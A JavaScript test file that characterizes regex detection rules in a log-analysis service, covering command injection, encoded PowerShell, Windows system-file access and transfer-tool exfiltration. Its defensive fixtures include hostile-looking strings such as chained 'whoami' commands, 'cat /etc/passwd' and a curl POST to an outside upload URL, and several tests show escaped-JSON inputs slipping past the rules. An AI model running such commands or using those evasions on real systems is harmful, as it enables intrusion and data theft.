const { describe, it } = require("node:test");
const assert = require("node:assert/strict");
const detectionRules = require("../data/detection_rules.json");
const logAnalysisService = require("../backend/services/logAnalysisService");
const { parseLogBatch } = require("../backend/services/logParserService");
const { EVENT_AWARE_RULES } = require("../backend/services/eventAwareRules");
const { matchEventAwareRule } = require("../backend/services/eventAwareMatcher");

const candidateIds = ["TRAV_003", "CMD_001", "CMD_002", "EXFIL_001"];
const ruleById = new Map(detectionRules.map((rule) => [rule.id, rule]));

function jsonLines(records) {
  return records.map((record) => JSON.stringify(record)).join("\n");
}

function fieldCount(ruleId, event) {
  const command = event.process?.command;
  return typeof command === "string"
    ? logAnalysisService.countPatternMatches(command, ruleById.get(ruleId))
    : 0;
}

async function rawMatch(input, ruleId) {
  const detection = await logAnalysisService.analyzeLogs(input);
  return detection.matchedRules.find((rule) => rule.id === ruleId) || null;
}

describe("process.command and process-command detection candidate characterization", () => {
  it("registers only EXFIL_001 from these process-command candidates", () => {
    assert.deepEqual(EVENT_AWARE_RULES.map(({ ruleId }) => ruleId), [
      "TRAV_001", "TRAV_002", "PROM_001", "CONF_001", "REDIR_001", "SCAN_001", "EXFIL_001",
      "SQLI_001", "SQLI_002", "SQLI_003", "SQLI_004", "XSS_001", "XSS_003", "XXE_001", "GRAPHQL_001",
      "SSRF_001"
    ]);
    for (const ruleId of ["TRAV_003", "CMD_001", "CMD_002"]) {
      assert.equal(EVENT_AWARE_RULES.some((rule) => rule.ruleId === ruleId), false);
    }
    assert.deepEqual(EVENT_AWARE_RULES.find(({ ruleId }) => ruleId === "EXFIL_001"), {
      ruleId: "EXFIL_001", fields: [["process", "command"]]
    });
  });

  it("extracts only the recognized plain-text command labels and preserves quoted values", () => {
    const batch = parseLogBatch([
      'process.command="powershell.exe -EncodedCommand A B; echo done, kept" status=blocked',
      "process_command='echo first; echo second, third' result=ok",
      "command=cat /etc/passwd, status=ok",
      "cmd=ipconfig /all trailing=value",
      "process.name=pwsh.exe process=worker"
    ].join("\n"));

    assert.deepEqual(batch.events.map((event) => event.process?.command), [
      "powershell.exe -EncodedCommand A B; echo done, kept",
      "echo first; echo second, third",
      "cat",
      "ipconfig",
      undefined
    ]);
    assert.equal(batch.events[4].process.name, "pwsh.exe");
  });

  it("ends unquoted values at whitespace, commas, and semicolons without consuming trailing fields", () => {
    const batch = parseLogBatch([
      "command=echo hello world status=ok",
      "command=whoami;result=ok",
      "cmd=dir,source=local",
      "command=echo \"quoted\" tail=ignored"
    ].join("\n"));

    assert.deepEqual(batch.events.map((event) => event.process?.command), [
      "echo", "whoami", "dir", "echo"
    ]);
  });

  it("does not validate that a recognized command label came from process telemetry", () => {
    const batch = parseLogBatch([
      'request payload contains command="echo harmless; whoami"',
      "command : whoami",
      "commandline=whoami"
    ].join("\n"));

    assert.equal(batch.events[0].process.command, "echo harmless; whoami");
    assert.equal(batch.events[1].process?.command, undefined);
    assert.equal(batch.events[2].process?.command, undefined);
  });

  it("recognizes the exact top-level and nested JSON command fields", () => {
    const batch = parseLogBatch(jsonLines([
      { command: "echo first second; whoami" },
      { cmd: "powershell.exe -EncodedCommand QQ==" },
      { process: { command: "C:\\Windows\\System32\\cmd.exe /c dir", name: "cmd.exe" } },
      { process: { cmd: "curl -X POST https://outside.example/upload" } },
      { process_command: "whoami", commandLine: "id", command_line: "dir", process: { commandLine: "pwd" } }
    ]));

    assert.deepEqual(batch.events.map((event) => event.process?.command), [
      "echo first second; whoami",
      "powershell.exe -EncodedCommand QQ==",
      "C:\\Windows\\System32\\cmd.exe /c dir",
      "curl -X POST https://outside.example/upload",
      undefined
    ]);
  });

  it("ignores missing, empty, null, numeric, and malformed command values", () => {
    const batch = parseLogBatch(jsonLines([
      { message: "missing" },
      { command: "" },
      { command: "   " },
      { command: null },
      { command: 42 },
      { process: { command: null } }
    ]));
    assert.ok(batch.events.every((event) => event.process?.command === undefined));

    const malformed = parseLogBatch([
      '{"process":{"command":"whoami"}',
      '{"message":"still malformed"}'
    ].join("\n"));
    assert.ok(malformed.parseWarnings?.some((warning) => warning.includes("malformed JSON Lines")));
    assert.ok(malformed.events.every((event) => event.process?.command === undefined));
  });

  it("requires multiple object lines before mapping JSON and ignores a single JSON object as a command record", () => {
    const input = '{"process":{"command":"whoami"}}';
    const batch = parseLogBatch(input);
    assert.equal(batch.events.length, 1);
    assert.equal(batch.events[0].process?.command, undefined);
  });

  it("records the exact candidate definitions and descriptions", () => {
    assert.deepEqual(candidateIds.map((id) => {
      const { id: ruleId, pattern, type, severity, description } = ruleById.get(id);
      return { id: ruleId, pattern, type, severity, description };
    }), [
      {
        id: "TRAV_003",
        pattern: "(?i)C:\\\\(Windows\\\\System32|boot\\.ini)",
        type: "Local File Inclusion",
        severity: "CRITICAL",
        description: "Detects access to sensitive Windows system files."
      },
      {
        id: "CMD_001",
        pattern: "[&|;]\\s*(whoami|id|ls|cat|dir|type|ipconfig|ifconfig)",
        type: "Command Injection",
        severity: "CRITICAL",
        description: "Detects command chaining used to execute OS commands."
      },
      {
        id: "CMD_002",
        pattern: "(?i)powershell(\\.exe)?\\s+-e",
        type: "Command Injection",
        severity: "CRITICAL",
        description: "Detects encoded PowerShell command execution."
      },
      {
        id: "EXFIL_001",
        pattern: "(?i)(curl|wget|scp|ftp|rsync)\\s+.*?https?://",
        type: "Data Exfiltration",
        severity: "HIGH",
        description: "Detects use of transfer tools pointed at external URLs."
      }
    ]);
  });

  it("evaluates each candidate against only the event that has its command signal", () => {
    const cases = [
      ["TRAV_003", String.raw`C:\Windows\System32\cmd.exe`],
      ["CMD_001", "echo ready; whoami"],
      ["CMD_002", "powershell.exe -EncodedCommand QQ=="],
      ["EXFIL_001", "curl -X POST https://outside.example/upload"]
    ];

    for (const [ruleId, command] of cases) {
      const batch = parseLogBatch(jsonLines([
        { process: { command } },
        { process: { command: "echo ordinary operation" } },
        { message: "missing process command" }
      ]));
      assert.ok(fieldCount(ruleId, batch.events[0]) > 0, ruleId);
      assert.equal(fieldCount(ruleId, batch.events[1]), 0, ruleId);
      assert.equal(fieldCount(ruleId, batch.events[2]), 0, ruleId);
    }
  });

  it("characterizes TRAV_003 raw paths, process commands, and raw-only request data", async () => {
    const positives = [String.raw`C:\Windows\System32\cmd.exe`, String.raw`C:\boot.ini`];
    for (const command of positives) {
      const input = `command="${command}"`;
      const batch = parseLogBatch(input);
      assert.ok(await rawMatch(input, "TRAV_003"));
      assert.equal(fieldCount("TRAV_003", batch.events[0]), 1);
    }

    const benign = parseLogBatch(jsonLines([
      { process: { command: "C:\\Program Files\\Example\\app.exe" } },
      { message: "missing process command" }
    ]));
    assert.equal(fieldCount("TRAV_003", benign.events[0]), 0);
    assert.equal(fieldCount("TRAV_003", benign.events[1]), 0);

    const request = String.raw`GET /download?file=C:\Windows\System32\cmd.exe HTTP/1.1`;
    const requestBatch = parseLogBatch(request);
    assert.ok(await rawMatch(request, "TRAV_003"));
    assert.equal(requestBatch.events[0].process?.command, undefined);

    const escapedInput = jsonLines([
      { process: { command: String.raw`C:\Windows\System32\cmd.exe` } },
      { message: "other event" }
    ]);
    const escapedBatch = parseLogBatch(escapedInput);
    assert.equal(await rawMatch(escapedInput, "TRAV_003"), null);
    assert.equal(fieldCount("TRAV_003", escapedBatch.events[0]), 1);
    assert.equal(matchEventAwareRule(escapedBatch.events, "TRAV_003"), null);
  });

  it("characterizes CMD_001 separators, target commands, benign commands, and input-only signals", async () => {
    const positives = ["echo ready; whoami", "echo ready | id", "echo ready & ipconfig /all"];
    for (const command of positives) {
      const batch = parseLogBatch(jsonLines([{ command }, { message: "ordinary event" }]));
      assert.ok(await rawMatch(batch.rawInput, "CMD_001"));
      assert.ok(fieldCount("CMD_001", batch.events[0]) > 0);
    }

    const benign = parseLogBatch(jsonLines([
      { command: "echo ready" },
      { command: "whoami" },
      { message: "missing command" }
    ]));
    assert.ok(benign.events.every((event) => fieldCount("CMD_001", event) === 0));

    const rawOnly = "request payload: value; whoami";
    const rawOnlyBatch = parseLogBatch(rawOnly);
    assert.ok(await rawMatch(rawOnly, "CMD_001"));
    assert.equal(rawOnlyBatch.events[0].process?.command, undefined);

    const encodedJson = [
      String.raw`{"command":"echo ready\u003b whoami"}`,
      '{"message":"ordinary event"}'
    ].join("\n");
    const encodedBatch = parseLogBatch(encodedJson);
    assert.equal(await rawMatch(encodedJson, "CMD_001"), null);
    assert.equal(fieldCount("CMD_001", encodedBatch.events[0]), 1);
  });

  it("characterizes CMD_002 PowerShell matches, broad -e matching, and raw-hidden JSON", async () => {
    const positive = "powershell.exe -EncodedCommand SQBFAFgA";
    const encodedBatch = parseLogBatch(jsonLines([{ process: { command: positive } }, { message: "other event" }]));
    assert.ok(await rawMatch(encodedBatch.rawInput, "CMD_002"));
    assert.equal(fieldCount("CMD_002", encodedBatch.events[0]), 1);

    const benignButMatched = "powershell.exe -ExecutionPolicy RemoteSigned";
    assert.equal(logAnalysisService.countPatternMatches(benignButMatched, ruleById.get("CMD_002")), 1,
      "the current -e prefix also matches options such as -ExecutionPolicy");
    const benign = parseLogBatch(jsonLines([
      { command: "powershell.exe -NoProfile -File script.ps1" },
      { command: "pwsh -EncodedCommand QQ==" },
      { message: "missing command" }
    ]));
    assert.ok(benign.events.every((event) => fieldCount("CMD_002", event) === 0));

    const rawOnly = "request parameter: powershell.exe -EncodedCommand QQ==";
    const rawOnlyBatch = parseLogBatch(rawOnly);
    assert.ok(await rawMatch(rawOnly, "CMD_002"));
    assert.equal(rawOnlyBatch.events[0].process?.command, undefined);

    const escapedInput = [
      String.raw`{"process":{"command":"powershell\u002eexe -EncodedCommand QQ=="}}`,
      '{"message":"other event"}'
    ].join("\n");
    const escapedBatch = parseLogBatch(escapedInput);
    assert.equal(await rawMatch(escapedInput, "CMD_002"), null);
    assert.equal(fieldCount("CMD_002", escapedBatch.events[0]), 1);
  });

  it("characterizes EXFIL_001 as a transfer-tool-plus-URL pattern within one string", async () => {
    const commands = [
      "curl -X POST https://outside.example/upload",
      "wget https://outside.example/archive",
      "scp report.txt https://outside.example/report"
    ];
    for (const command of commands) {
      const batch = parseLogBatch(jsonLines([{ process: { command } }, { message: "other event" }]));
      assert.ok(await rawMatch(batch.rawInput, "EXFIL_001"));
      assert.equal(fieldCount("EXFIL_001", batch.events[0]), 1);
      assert.equal(matchEventAwareRule(batch.events, "EXFIL_001").count, 1);
    }

    const benign = parseLogBatch(jsonLines([
      { command: "curl --version" },
      { command: "cat /var/log/app.log" },
      { message: "missing command" }
    ]));
    assert.ok(benign.events.every((event) => fieldCount("EXFIL_001", event) === 0));
    assert.equal(logAnalysisService.countPatternMatches(
      "curl http://localhost/health", ruleById.get("EXFIL_001")
    ), 1, "the existing pattern does not distinguish external URLs from localhost");

    const rawOnly = "request note: curl https://outside.example/file";
    const rawOnlyBatch = parseLogBatch(rawOnly);
    assert.ok(await rawMatch(rawOnly, "EXFIL_001"));
    assert.equal(rawOnlyBatch.events[0].process?.command, undefined);

    const escapedInput = [
      String.raw`{"process":{"command":"\u0063url https://outside.example/file"}}`,
      '{"message":"other event"}'
    ].join("\n");
    const escapedBatch = parseLogBatch(escapedInput);
    assert.equal(await rawMatch(escapedInput, "EXFIL_001"), null);
    assert.equal(fieldCount("EXFIL_001", escapedBatch.events[0]), 1);
  });
});
